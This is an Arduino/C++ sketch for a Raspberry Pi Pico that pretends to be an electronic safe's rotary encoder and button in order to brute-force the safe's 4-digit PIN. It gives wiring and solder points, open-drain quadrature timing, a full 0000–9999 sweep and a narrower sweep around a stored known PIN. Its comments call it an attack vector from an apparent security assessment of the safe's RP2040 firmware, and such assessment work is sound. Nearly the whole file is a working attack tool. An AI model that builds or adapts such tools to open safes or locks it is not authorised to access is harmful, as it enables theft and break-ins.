// ---------------------------------------------------------------------------
// Rotary-encoder emulator for physical PIN brute-force (attack vector 4).
//
// An attacker Raspberry Pi Pico impersonates the safe's rotary encoder + push
// button, so the 4-digit PIN can be swept without a human turning the knob.
// This is the "dumb" variant: a plain 0000..9999 sweep at an adjustable rate.
// A timing-oracle-driven variant (>= 40 tries instead of 10000) can be layered
// on later; see the report.
//
// TARGET (the safe, an RP2040) — established from firmware `board_gpio_init`:
//   all three lines are INPUTs with pull-ups, active LOW.
//     GPIO 29 = encoder channel A   (both-edge IRQ + callback -> quadrature)
//     GPIO 27 = encoder channel B   (both-edge IRQ           -> quadrature)
//     GPIO 28 = push button SW      (falling-edge IRQ, confirm digit)
//
// WIRING (attacker Pico  ->  target). ONLY 3 signals + a common ground.
//   Pico GP2  (A_OUT)  ->  target A line  (encoder pin A  / net of GPIO 29)
//   Pico GP3  (B_OUT)  ->  target B line  (encoder pin B  / net of GPIO 27)
//   Pico GP4  (SW_OUT) ->  target SW line (button pin     / net of GPIO 28)
//   Pico GND           ->  target GND     (RP2040 ground / debug-header GND)
//   Pico GP5  (SENSE)  ->  optional: an unlock indicator on the target (off by default)
//
//   DO NOT connect the two boards' 3V3 / VBUS together — each is self-powered,
//   sharing a rail risks back-powering. Only GND + the 3 signal lines.
//
//   The real encoder may stay soldered in parallel: as long as nobody turns it,
//   its contacts are open (high-Z) and do not fight our open-drain drive.
//
//   Solder points: easiest at the encoder's own A / B / SW / common pads;
//   verify each net with a multimeter continuity check to RP2040 pins 29/27/28
//   before trusting the A/B/SW mapping above.
//
// DRIVE MODEL: open-drain. We only ever pull a line LOW (assert) or release it
// to high-Z (the target's pull-up restores HIGH). We never source a HIGH.
//
// CONTROL: 115200-baud USB serial console. Single-char commands, see printHelp().
// ---------------------------------------------------------------------------

#include <Arduino.h>

// ----------------------------- Pin assignment ------------------------------
static const uint8_t PIN_A = 2;				   // -> target encoder A (GPIO 29 net)
static const uint8_t PIN_B = 3;				   // -> target encoder B (GPIO 27 net)
static const uint8_t PIN_SW = 4;			   // -> target button SW (GPIO 28 net)
static const uint8_t PIN_SENSE = 5;			   // <- optional unlock indicator (input)
static const uint8_t STATUS_LED = LED_BUILTIN; // on-board LED: lit while running
											   // (PIN_LED is a core macro, don't reuse it)

// --------------------------- Calibration config ----------------------------
// Everything below is a guess until measured on the bench in jog mode ('u'/'d'
// step the display, 'p' presses). Adjust, re-flash or set live where noted.

// Quadrature quarter-steps (single-edge transitions) needed to move the shown
// digit by 1. A detented encoder emits 4 edges/detent and firmware usually
// divides by 4 -> 4 here. If one jog step moves the display by more/less than 1,
// change this. Live-settable with 'q<n>'.
static int QUARTERS_PER_STEP = 4;

// Set true if turning "up" makes the display count DOWN. Live-toggle with 'i'.
static bool INVERT_DIR = false;

// Digit shown by the target when the *very first* attempt begins (power-on).
static int INITIAL_VALUE = 0;

// Value the display returns to after a press (start of the next digit).
//   -1 = display carries over (keep tracking); 0..9 = it resets to that value.
static int RESET_AFTER_PRESS = -1;
// Value the display returns to after a full (rejected) 4-digit attempt.
static int RESET_AFTER_ATTEMPT = -1;

// --------------------------------- Timing ----------------------------------
// Microseconds. All are divided by (g_speedPct/100): higher percent = faster.
// EDGE_US must stay ABOVE the target's software debounce window, or quadrature
// edges get merged and steps are lost. If the display miscounts when you speed
// up, slow down (EDGE_US / DETENT_GAP_US are the ones that matter).
// These are the original conservative (bounce-safe) values -- fast-sweep
// experiments dropped edges, so we are back to the reliable baseline.
static uint32_t EDGE_US = 3000;			 // between quadrature edges
static uint32_t DETENT_GAP_US = 6000;	 // after each 1-digit detent
static uint32_t PRESS_US = 40000;		 // button held low
static uint32_t RELEASE_US = 60000;		 // button released before next act
static uint32_t DIGIT_GAP_US = 80000;	 // between confirmed digits
static uint32_t CHECK_US = 250000;		 // after 4th press: eval + oracle
static uint32_t ATTEMPT_GAP_US = 150000; // between attempts

// ------------------------------- Sense (opt) -------------------------------
static bool SENSE_ENABLE = false;	  // watch PIN_SENSE for unlock
static int SENSE_ACTIVE_LEVEL = HIGH; // level that means "unlocked"

// --------------------------------- Speed -----------------------------------
// THE speed knob. Overall sweep-rate multiplier applied to every timing above
// at boot (100 = use the *_US values as-is; higher = faster). Runtime '+'/'-'
// adjust from here, up to SPEED_MAX_PCT. Back to the reliable 100% baseline
// after fast-sweep experiments dropped edges.
static const int SWEEP_SPEED_PCT = 100; // boot sweep speed, %
static const int SPEED_MAX_PCT = 1000;	// ceiling for '+'

// Known-good PIN and the speed used to enter it on demand (command 'k').
static const int KNOWN_PIN = 3952;
static const int KNOWN_ENTRY_SPEED_PCT = 100;

// Neighbourhood sweep: instead of 0000..9999, sweep only +/- SWEEP_RADIUS
// around the known-good PIN (SWEEP_CENTER). The sweep starts at the low edge
// (center - radius) and stops at the high edge (center + radius). Widen
// SWEEP_RADIUS (or use 'j' to jump anywhere in 0..9999) to search further.
static const int SWEEP_CENTER = KNOWN_PIN; // 3952
static const int SWEEP_RADIUS = 50;		   // +/- window around the center

// ------------------------------- Run state ---------------------------------
static int g_speedPct = SWEEP_SPEED_PCT; // live speed %; '+'/'-' adjust
static bool g_running = false;
static bool g_fullSweep = false; // 'f' toggles full 0000..9999 vs neighbourhood
static int g_attempt = 0;  // next attempt index 0..9999
static int g_believed = 0; // our belief of the shown digit
static uint8_t g_qidx = 0; // quadrature state index 0..3

// Clamped bounds of the neighbourhood sweep (see SWEEP_CENTER / SWEEP_RADIUS).
static inline int sweepStart()
{
	if (g_fullSweep)
		return 0;
	int s = SWEEP_CENTER - SWEEP_RADIUS;
	return s < 0 ? 0 : s;
}
static inline int sweepEnd()
{
	if (g_fullSweep)
		return 9999;
	int e = SWEEP_CENTER + SWEEP_RADIUS;
	return e > 9999 ? 9999 : e;
}

// Gray-coded quadrature states for (A,B); consecutive states differ by 1 bit.
static const uint8_t GRAY_A[4] = {1, 0, 0, 1};
static const uint8_t GRAY_B[4] = {1, 1, 0, 0};

// ------------------------------ Low-level I/O ------------------------------
// Open-drain: level 1 = release to high-Z (target pull-up wins), 0 = drive low.
static inline void setLine(uint8_t pin, uint8_t level)
{
	if (level)
	{
		pinMode(pin, INPUT); // high-Z; no internal pull added
	}
	else
	{
		pinMode(pin, OUTPUT);
		digitalWrite(pin, LOW); // active-low assert
	}
}

// Scaled busy-wait honouring g_speedPct. Splits into ms + us for long waits.
static void waitUs(uint32_t us)
{
	uint64_t eff = (uint64_t)us * 100u / (uint32_t)g_speedPct;
	uint32_t ms = (uint32_t)(eff / 1000u);
	uint32_t rem = (uint32_t)(eff % 1000u);
	if (ms)
		delay(ms);
	if (rem)
		delayMicroseconds(rem);
}

static inline void applyQuadState(uint8_t idx)
{
	setLine(PIN_A, GRAY_A[idx]);
	setLine(PIN_B, GRAY_B[idx]);
}

// One quadrature quarter-step. dir > 0 advances the Gray sequence, dir < 0 reverses.
static void quarter(int dir)
{
	g_qidx = (uint8_t)((g_qidx + (dir > 0 ? 1 : 3)) & 3);
	applyQuadState(g_qidx);
	waitUs(EDGE_US);
}

// Move the shown digit by `counts` in Gray direction `dir` (one detent each).
static void stepDisplay(int dir, int counts)
{
	for (int c = 0; c < counts; c++)
	{
		for (int k = 0; k < QUARTERS_PER_STEP; k++)
			quarter(dir);
		waitUs(DETENT_GAP_US);
	}
}

// Rotate from the believed value to `target`, taking the shorter direction.
static void enterDigit(int target)
{
	int dirUp = INVERT_DIR ? -1 : +1;
	int up = ((target - g_believed) % 10 + 10) % 10; // 0..9 steps upward
	int down = (10 - up) % 10;						 // 0..9 steps downward
	if (up == 0)
	{
		/* already there */
	}
	else if (up <= down)
	{
		stepDisplay(dirUp, up);
	}
	else
	{
		stepDisplay(-dirUp, down);
	}
	g_believed = target;
}

static void press()
{
	setLine(PIN_SW, 0);
	waitUs(PRESS_US);
	setLine(PIN_SW, 1);
	waitUs(RELEASE_US);
}

// True if the sense line has held the unlock level for a short debounce window.
static bool senseUnlocked()
{
	if (!SENSE_ENABLE)
		return false;
	for (int i = 0; i < 8; i++)
	{
		if (digitalRead(PIN_SENSE) != SENSE_ACTIVE_LEVEL)
			return false;
		delay(2);
	}
	return true;
}

// Enter and confirm one 4-digit code. Returns true if an unlock was sensed.
static bool doAttempt(int d0, int d1, int d2, int d3)
{
	const int d[4] = {d0, d1, d2, d3};
	for (int i = 0; i < 4; i++)
	{
		enterDigit(d[i]);
		press();
		if (i < 3 && RESET_AFTER_PRESS >= 0)
			g_believed = RESET_AFTER_PRESS;
		if (i < 3)
			waitUs(DIGIT_GAP_US);
	}
	waitUs(CHECK_US); // let the target evaluate (incl. oracle)
	bool ok = senseUnlocked();
	if (RESET_AFTER_ATTEMPT >= 0)
		g_believed = RESET_AFTER_ATTEMPT;
	return ok;
}

// -------------------------------- Console ----------------------------------
static void idleLines()
{
	g_qidx = 0;
	setLine(PIN_A, 1);
	setLine(PIN_B, 1);
	setLine(PIN_SW, 1);
}

static void printStatus()
{
	Serial.printf("[status] running=%d next=%04d believed=%d speed=%d%% "
				  "q/step=%d invert=%d\r\n",
				  g_running, g_attempt, g_believed, g_speedPct, QUARTERS_PER_STEP, INVERT_DIR);
	Serial.printf("[sweep]  mode=%s window=%04d..%04d\r\n",
				  g_fullSweep ? "FULL" : "neighbourhood", sweepStart(), sweepEnd());
	Serial.printf("[timing] edge=%lu detent=%lu press=%lu release=%lu "
				  "digitgap=%lu check=%lu attemptgap=%lu (us, pre-scale)\r\n",
				  (unsigned long)EDGE_US, (unsigned long)DETENT_GAP_US, (unsigned long)PRESS_US,
				  (unsigned long)RELEASE_US, (unsigned long)DIGIT_GAP_US, (unsigned long)CHECK_US,
				  (unsigned long)ATTEMPT_GAP_US);
}

static void printHelp()
{
	Serial.println(F("\r\n=== encoder emulator (attack4) ==="));
	Serial.println(F("Jog / calibration:"));
	Serial.println(F("  u  step display up 1     d  step display down 1"));
	Serial.println(F("  p  press button once     z  declare current display = 0"));
	Serial.println(F("  q<n> quarter-steps per digit (e.g. q4)"));
	Serial.println(F("  i  toggle direction invert"));
	Serial.println(F("Brute-force:"));
	Serial.println(F("  g  start/resume sweep    s  stop (pause)"));
	Serial.printf("  r  reset sweep to window start %04d (believed=INITIAL_VALUE)\r\n",
				  sweepStart());
	Serial.printf("  (sweep window: %04d..%04d, center %04d +/-%d)\r\n",
				  sweepStart(), sweepEnd(), SWEEP_CENTER, SWEEP_RADIUS);
	Serial.println(F("  k  enter the known-good PIN once, slow & reliable"));
	Serial.println(F("  f  toggle FULL 0000..9999 sweep <-> neighbourhood"));
	Serial.println(F("  j<n> jump to attempt n   (e.g. j3952)"));
	Serial.printf("Speed:  +/- change by 25%%  (10..%d%%, boot=%d%%)\r\n",
				  SPEED_MAX_PCT, SWEEP_SPEED_PCT);
	Serial.println(F("Misc:   ?  status          h  this help"));
}

// Read a non-negative integer that follows a command char on the serial line.
static long readNumberArg()
{
	long v = 0;
	bool got = false;
	unsigned long t0 = millis();
	while (millis() - t0 < 50)
	{ // brief window for the digits to arrive
		while (Serial.available())
		{
			int c = Serial.peek();
			if (c >= '0' && c <= '9')
			{
				v = v * 10 + (Serial.read() - '0');
				got = true;
				t0 = millis();
			}
			else
			{
				Serial.read(); // consume terminator (newline etc.)
				return got ? v : -1;
			}
		}
	}
	return got ? v : -1;
}

// Enter one specific 4-digit code once, from a clean idle start, at the slow
// KNOWN_ENTRY_SPEED_PCT for maximum reliability. Used by 'k' to punch in the
// known-good PIN. Restores the previous sweep speed and leaves the sweep
// paused. Reports the sense result (only meaningful when SENSE_ENABLE).
static void enterKnownPin(int pin)
{
	int d0 = (pin / 1000) % 10, d1 = (pin / 100) % 10;
	int d2 = (pin / 10) % 10, d3 = pin % 10;

	bool wasRunning = g_running;
	int savedSpeed = g_speedPct;
	g_running = false; // never interleave with the sweep
	g_speedPct = KNOWN_ENTRY_SPEED_PCT;

	idleLines();				 // known line state
	g_believed = INITIAL_VALUE;	 // known display start
	Serial.printf("[known] entering PIN=%d%d%d%d at %d%% (slow/reliable)...\r\n",
				  d0, d1, d2, d3, g_speedPct);

	bool unlocked = doAttempt(d0, d1, d2, d3);
	idleLines();

	if (SENSE_ENABLE)
	{
		if (unlocked)
			Serial.printf("[known] SENSE: unlock detected -> safe is OPEN "
						  "at PIN=%d%d%d%d\r\n",
						  d0, d1, d2, d3);
		else
			Serial.println(F("[known] SENSE: no unlock detected (wrong PIN, "
							 "miscount, or sense wiring/level off)"));
	}
	else
	{
		Serial.println(F("[known] code entered. SENSE is OFF, so I cannot "
						 "confirm electrically -- check the safe: if the PIN "
						 "and step-counting are right it should now be unlocked."));
	}

	g_speedPct = savedSpeed; // restore sweep speed
	if (wasRunning)
		Serial.println(F("[known] note: sweep was running; left paused. 'g' to resume."));
}

static void handleChar(int c)
{
	switch (c)
	{
	case 'u':
		enterDigit((g_believed + 1) % 10);
		Serial.printf("[jog] up -> believed=%d\r\n", g_believed);
		break;
	case 'd':
		enterDigit((g_believed + 9) % 10);
		Serial.printf("[jog] down -> believed=%d\r\n", g_believed);
		break;
	case 'p':
		press();
		Serial.println(F("[jog] press"));
		break;
	case 'z':
		g_believed = 0;
		Serial.println(F("[jog] believed:=0"));
		break;
	case 'q':
	{
		long n = readNumberArg();
		if (n >= 1 && n <= 64)
		{
			QUARTERS_PER_STEP = (int)n;
			Serial.printf("[cfg] quarters/step=%d\r\n", QUARTERS_PER_STEP);
		}
		else
			Serial.println(F("[cfg] usage: q<1..64>"));
	}
	break;
	case 'i':
		INVERT_DIR = !INVERT_DIR;
		Serial.printf("[cfg] invert=%d\r\n", INVERT_DIR);
		break;
	case 'g':
		g_running = true;
		Serial.println(F("[run] start/resume"));
		break;
	case 's':
		g_running = false;
		idleLines();
		Serial.println(F("[run] stop"));
		break;
	case 'r':
		g_running = false;
		g_attempt = sweepStart();
		g_believed = INITIAL_VALUE;
		idleLines();
		Serial.printf("[run] reset to %04d (window start)\r\n", g_attempt);
		break;
	case 'f':
		g_fullSweep = !g_fullSweep;
		g_running = false;
		g_attempt = sweepStart();
		g_believed = INITIAL_VALUE;
		idleLines();
		Serial.printf("[run] %s sweep %04d..%04d, reset to %04d. 'g' to start.\r\n",
					  g_fullSweep ? "FULL" : "neighbourhood",
					  sweepStart(), sweepEnd(), g_attempt);
		break;
	case 'j':
	{
		long n = readNumberArg();
		if (n >= 0 && n <= 9999)
		{
			g_attempt = (int)n;
			g_believed = INITIAL_VALUE;
			Serial.printf("[run] jump -> %04d\r\n", g_attempt);
		}
		else
			Serial.println(F("[run] usage: j<0..9999>"));
	}
	break;
	case 'k':
		enterKnownPin(KNOWN_PIN);
		break;
	case '+':
		g_speedPct = min(SPEED_MAX_PCT, g_speedPct + 25);
		Serial.printf("[speed] %d%%\r\n", g_speedPct);
		break;
	case '-':
		g_speedPct = max(10, g_speedPct - 25);
		Serial.printf("[speed] %d%%\r\n", g_speedPct);
		break;
	case '?':
		printStatus();
		break;
	case 'h':
		printHelp();
		break;
	default:
		break; // ignore whitespace / unknown
	}
}

// --------------------------------- Setup -----------------------------------
void setup()
{
	pinMode(STATUS_LED, OUTPUT);
	digitalWrite(STATUS_LED, LOW);
	idleLines();
	if (SENSE_ENABLE)
		pinMode(PIN_SENSE, INPUT);

	Serial.begin(115200);
	unsigned long t0 = millis();
	while (!Serial && millis() - t0 < 3000) { /* wait briefly for USB CDC */ }

	g_believed = INITIAL_VALUE;
	g_attempt = sweepStart(); // begin in the neighbourhood of the known PIN
	printHelp();
	printStatus();
	Serial.printf("[ready] not running. Sweep window %04d..%04d (center %04d "
				  "+/-%d). Send 'g' to start.\r\n",
				  sweepStart(), sweepEnd(), SWEEP_CENTER, SWEEP_RADIUS);
}

// --------------------------------- Loop ------------------------------------
void loop()
{
	while (Serial.available())
		handleChar(Serial.read());

	if (!g_running)
	{
		digitalWrite(STATUS_LED, LOW);
		return;
	}
	if (g_attempt > sweepEnd())
	{
		g_running = false;
		idleLines();
		Serial.printf("[run] exhausted window %04d..%04d with no sensed unlock\r\n",
					  sweepStart(), sweepEnd());
		return;
	}

	digitalWrite(STATUS_LED, HIGH);
	int a = g_attempt;
	int d0 = a / 1000, d1 = (a / 100) % 10, d2 = (a / 10) % 10, d3 = a % 10;
	Serial.printf("[try] %d%d%d%d\r\n", d0, d1, d2, d3);

	bool unlocked = doAttempt(d0, d1, d2, d3);
	if (unlocked)
	{
		g_running = false;
		idleLines();
		Serial.printf("[FOUND] sensed unlock at PIN=%d%d%d%d\r\n", d0, d1, d2, d3);
		for (int i = 0; i < 20; i++)
		{
			digitalWrite(STATUS_LED, i & 1);
			delay(100);
		}
		return;
	}
	g_attempt++;
}
